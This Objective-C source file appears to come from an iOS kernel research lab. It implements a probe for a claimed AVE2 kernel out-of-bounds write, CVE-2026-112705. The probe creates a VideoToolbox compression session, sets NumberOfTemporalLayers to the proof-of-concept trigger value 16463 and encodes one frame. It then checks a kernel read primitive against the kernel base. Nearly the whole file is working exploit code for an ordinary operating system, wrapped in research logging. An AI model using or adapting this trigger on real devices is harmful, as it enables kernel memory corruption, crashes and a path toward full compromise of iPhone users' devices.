//
//  P142AVETemporal.m — the AVE2 TEMPORAL-LAYERS KNOB (CVE-2026-112705). p142.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Vector credit: MMdAS (repo MchinaMd57764/AVETemporalPoC-CVE-2026-112705),
//  original discovery credited to the Calif/Chollima team. Session laws
//  copied from AVEVTSmoke (the pack's own VT law: create → prepare → one
//  encode → complete → invalidate). The knob = NumberOfTemporalLayers via
//  VTSessionSetProperty with the plain-string key (the PoC's property).
//
//  HONESTY: kernel WRITE state-manipulation probe (count-scaled fill);
//  panic = the count-law receipt, BY DESIGN; one value per tap;
//  hasKread stays kread32-gated; tokens/logs never leave the device.
//

#import "P142AVETemporal.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "LabBandit.h"
#import "P007KreadLane.h"
#import "P007Board.h"

#import <VideoToolbox/VideoToolbox.h>
#import <CoreVideo/CoreVideo.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <fcntl.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P142_BUILD   @"p142-avetemporal-v1"
#define P142_KEY     @"NumberOfTemporalLayers"
#define P142_DEFAULT 16463         /* the PoC's trigger threshold */
#define P142_SURVIVE 16462         /* the PoC's surviving value */

static void p142_flushCB(void *_Nullable refCon, void *_Nullable e,
                         OSStatus status, VTEncodeInfoFlags info,
                         CMSampleBufferRef _Nullable sb) {
    (void)refCon; (void)e; (void)status; (void)info; (void)sb;
}

static NSMutableString *g_buf; static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *o = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:o];
    if (g_fd >= 0) { const char *p = o.UTF8String;
        if (p) { write(g_fd, p, strlen(p)); fcntl(g_fd, F_FULLFSYNC); } }
}
static void Lf(NSString *fmt, ...) { va_list a; va_start(a, fmt);
    NSString *l = [[NSString alloc] initWithFormat:fmt arguments:a]; va_end(a); L(l); }
static NSString *P142R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

static void p142_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p142", arms, 1, &sr, 0, "p142 avetemporal auto-learn",
                      "ok", "survived", attr, sizeof attr);
    LabBanditRecord("p142", 0, outcome);
}

@implementation P142AVETemporal

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p142_avetemporal_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p142 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P142_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[vector credit] CVE-2026-112705 borrowed: MMdAS PoC (A V E 2 kernel");
    L(@"  OOB write via NumberOfTemporalLayers=16463; 16462 survives; 27.2");
    L(@"  added the -12900 pre-check). The lab's fill-store conversion class");
    L(@"  (the p088/p112 geometry) with a LIVE count knob.");
    L(@"[!] PANIC-POSSIBLE BY DESIGN = the count-law receipt; ONE encode");
    L(@"  per tap; knob value = Documents/p142_layers.txt (decimal; 0 =");
    L(@"  the 16462 survival control, blank = 16463 the PoC row).");

    /* the knob */
    long layers = P142_DEFAULT;
    NSString *knob = [NSString stringWithContentsOfFile:
        [docs stringByAppendingPathComponent:@"p142_layers.txt"]
        encoding:NSUTF8StringEncoding error:nil];
    if (knob) {
        long v = strtol(knob.UTF8String, NULL, 10);
        if (v > 0) layers = v;
        Lf(@"[*] knob file present: layers=%ld", layers);
    } else {
        Lf(@"[*] no knob file: layers=%ld (the PoC row)", layers);
    }

    id<NSObject> nothing = nil; (void)nothing;   /* clang tidy */

    /* ---- the session (AVEVTSmoke law) ---- */
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_H264,
        NULL, NULL, NULL, p142_flushCB, (__bridge void *)docs, &session);
    if (st != noErr || !session) {
        Lf(@"[-] VTCompressionSessionCreate failed: %d (0x%x)", (int)st,
           (unsigned)st);
        p142_bandit("nocreate"); return P142R();
    }
    L(@"[1] session created");

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime,
                         kCFBooleanTrue);
    CFStringRef key = (__bridge CFStringRef)P142_KEY;
    CFNumberRef val = CFNumberCreate(kCFAllocatorDefault,
                                     kCFNumberSInt32Type, &(int32_t){ (int32_t)layers });
    st = VTSessionSetProperty(session, key, val);
    CFRelease(val);
    Lf(@"[2] SetProperty(NumberOfTemporalLayers=%ld) st=%d (0 = ok;"
       @" -12912/-6662 = the caps-wall class; else = the property's own"
       @" reply)", layers, (int)st);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    Lf(@"[3] Prepare st=%d", (int)st);
    if (st != noErr) {
        L(@"    Prepare refused = the pre-encode wall (the 27.2-class law");
        L(@"    may already exist on this train — the honest row regardless)");
        VTCompressionSessionInvalidate(session); CFRelease(session);
        p142_bandit("prepare-refused"); return P142R();
    }

    CVPixelBufferRef pb = NULL;
    st = CVPixelBufferCreate(kCFAllocatorDefault, 1280, 720,
                             kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                             NULL, &pb);
    if (st != noErr || !pb) {
        Lf(@"[-] CVPixelBufferCreate failed: %d", (int)st);
        VTCompressionSessionInvalidate(session); CFRelease(session);
        p142_bandit("nopb"); return P142R();
    }

    L(@"[4] ONE ENCODE (the PoC's panic point — IN FLIGHT)");
    VTEncodeInfoFlags flags = 0;
    st = VTCompressionSessionEncodeFrame(session, pb,
        CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, &flags);
    Lf(@"[4] EncodeFrame returned st=%d flags=0x%x", (int)st, (unsigned)flags);
    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);

    CVPixelBufferRelease(pb);
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
    L(@"[5] session invalidated (a clean return = survived this count)");

    /* the honest KRW self-test tail (survival only; never a read claim) */
    L(@"=== STAGE GATE (honest KRW self-test) ===");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this session. Honest.");
        p142_bandit(layers == P142_DEFAULT ? "lane-closed-poc-row" :
                    "lane-closed-knob-row");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)",
               (unsigned long long)kb);
            p142_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p142_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    Lf(@"=== p142 end %@ ===", LabLocalMilitaryNow());
    return P142R();
}

@end